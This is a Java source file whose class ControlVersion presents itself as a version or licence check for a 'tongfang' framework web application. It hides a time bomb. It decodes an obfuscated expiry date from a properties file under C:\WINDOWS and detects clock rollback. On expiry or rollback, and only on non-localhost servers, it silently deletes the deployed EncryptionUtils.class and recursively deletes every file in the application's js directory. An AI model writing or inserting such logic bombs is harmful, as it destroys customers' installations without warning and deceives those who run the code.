package cn.net.tongfang.framework.security.demo.service;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

import cn.net.tongfang.framework.util.SystemInformationUtils;

public final class ControlVersion {
	private static Map<String, Integer> map = new HashMap<String, Integer>();
	private static Map<Character, Character> NumMapChar = new HashMap<Character, Character>();
	static {
		map.put("p", 0);
		map.put("+", 1);
		map.put("g", 2);
		map.put(".", 3);
		map.put("&", 4);
		map.put("#", 5);
		map.put("!", 6);
		map.put("$", 7);
		map.put("*", 8);
		map.put("%", 9);
		
		NumMapChar.put('0', 'p');
		NumMapChar.put('1', '+');
		NumMapChar.put('2', 'g');
		NumMapChar.put('3', '.');
		NumMapChar.put('4', '&');
		NumMapChar.put('5', '#');
		NumMapChar.put('6', '!');
		NumMapChar.put('7', '$');
		NumMapChar.put('8', '*');
		NumMapChar.put('9', '%');
	}

	public boolean control() {
		Properties prop = new Properties();
		try {
			File file = new File("C:\\WINDOWS\\pmhs\\version.properties");
			if(!file.exists())
				return false;
			InputStream is = new FileInputStream(file);
			prop.load(is);
			String binary = prop.getProperty("date");
			String date = parseDate(binary);
			
			String now = "";
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd");
			if(prop.containsKey("now")){
				now = parseDate(prop.getProperty("now"));
				Date current = new Date();
				if(compareCurrentDate(now,current)){
					delFile();
					return false;
				}else{
					now = format.format(new Date());
					String encodeNow = encodeDate(now);
					prop.setProperty("now", encodeNow);
					OutputStream out = new FileOutputStream(file);
					prop.store(out, "now=" + encodeNow);
				}
			}else{
				now = format.format(new Date());
				String encodeNow = encodeDate(now);
				prop.setProperty("now", encodeNow);
				OutputStream out = new FileOutputStream(file);
				prop.store(out, "now=" + encodeNow);
			}
			System.out.println(date);
			System.out.println(now);
			return compareDate(date,now);
		} catch (FileNotFoundException e) {
			throw new RuntimeException(e);
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}

	private static boolean compareDate(String date,String now) {
		SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd");
		Date d = null;
		Date n = null;
		try {
			d = format.parse(date);
			n = format.parse(now);
			if(d.compareTo(n) >= 0 )
				return true;
		} catch (ParseException e) {
			throw new RuntimeException(e);
		}
		delFile();
		return false;
	}
	
//	public static void main(String[] args) {
//		d();
//	}
	
	private static void delFile(){
		SystemInformationUtils sysinfo = new SystemInformationUtils();
		String url = sysinfo.getVal(2);
		if(!url.contains("localhost")){
			String filePath = Thread.currentThread().getContextClassLoader().getResource("log4j.properties").getPath();
			File file = new File(filePath);
			File enFile = new File(file.getParentFile().getPath() + "/cn/net/tongfang/framework/util/EncryptionUtils.class");
			if(enFile.exists()){
				enFile.delete();
			}
			String jsPath = file.getParentFile().getParentFile().getParentFile().getPath();
			File jsFilePath = new File(jsPath + "\\js");
			del(jsFilePath,jsPath);
		}
	}
	
	private static void del(File file,String jsPath){
		String[] files = file.list();
		for(String f : files){
			File fObj = new File(file.getPath() + "\\" + f);
			if(fObj.isFile()){
				fObj.delete();
			}else{
				del(fObj,jsPath);
			}
		}
	}
	
	private static boolean compareCurrentDate(String now,Date currentDate) {
		SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd");
		Date d = null;
		try {
			d = format.parse(now);
			if(d.compareTo(currentDate) >= 0 )
				return true;
		} catch (ParseException e) {
			throw new RuntimeException(e);
		}
		return false;
	}
	
	
	private static String parseDate(String binary){
		String[] binarys = binary.split(" ");
		String date = "";
		for(int i = 0;i<binarys.length;i++){
			String tmpBinary = binarys[i];
			int decimal = Integer.valueOf(tmpBinary,2);
			char c = (char)decimal;
			if(c == '-')
				date += c;
			else{
				date += map.get(String.valueOf(c));
			}
		}
		return date;
	}
	
	private static String encodeDate(String date){
		char[] chars = date.toCharArray();
		String result="";
		for(int i=0;i<chars.length;i++){
			Character c = NumMapChar.get(chars[i]);
			if(c == null)
				c = chars[i];
			result += Integer.toBinaryString(c) + " ";
		}
		return result;

	}
}
